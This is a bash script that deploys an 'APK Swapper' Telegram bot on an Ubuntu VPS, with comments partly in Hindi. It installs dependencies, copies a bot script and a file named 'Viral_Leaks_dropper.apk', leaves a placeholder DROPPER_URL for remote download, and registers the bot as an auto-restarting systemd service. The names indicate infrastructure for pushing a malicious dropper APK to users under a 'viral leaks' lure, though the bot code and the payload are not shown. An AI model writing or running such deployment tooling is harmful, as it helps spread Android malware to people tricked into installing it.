#!/bin/bash
# Deploy APK Swapper Bot on VPS (Ubuntu 24.04)
# Run: bash deploy.sh
set -e

BOT_DIR="/opt/apk-swapper"
SERVICE="apk-swapper"
BOT_TOKEN="${BOT_TOKEN:-}"   # export BOT_TOKEN=<token> pehle set karo
DROPPER_URL=""   # agar remote se download karna ho

echo "=== APK Swapper Bot Deploy ==="

# 1. Dependencies
apt-get update -qq
apt-get install -y python3 python3-pip python3-venv wget -qq

# 2. Bot directory
mkdir -p "$BOT_DIR"
cd "$BOT_DIR"

# 3. Copy files (yeh script ke saath same folder mein hone chahiye)
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cp "$SCRIPT_DIR/swapper_bot.py"          "$BOT_DIR/"
cp "$SCRIPT_DIR/Viral_Leaks_dropper.apk" "$BOT_DIR/"

# 4. Python venv
python3 -m venv venv
venv/bin/pip install -q --upgrade pip
venv/bin/pip install -q python-telegram-bot pycryptodome

# 5. Systemd service
cat > /etc/systemd/system/${SERVICE}.service << EOF
[Unit]
Description=APK Swapper Telegram Bot
After=network.target

[Service]
Type=simple
WorkingDirectory=${BOT_DIR}
Environment="BOT_TOKEN=${BOT_TOKEN}"
ExecStart=${BOT_DIR}/venv/bin/python3 ${BOT_DIR}/swapper_bot.py
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF

# 6. Enable + start
systemctl daemon-reload
systemctl enable "$SERVICE"
systemctl restart "$SERVICE"

sleep 2
systemctl status "$SERVICE" --no-pager

echo ""
echo "=== Done ==="
echo "Logs dekhne ke liye: journalctl -u $SERVICE -f"
echo "Restart: systemctl restart $SERVICE"
echo "Stop:    systemctl stop $SERVICE"
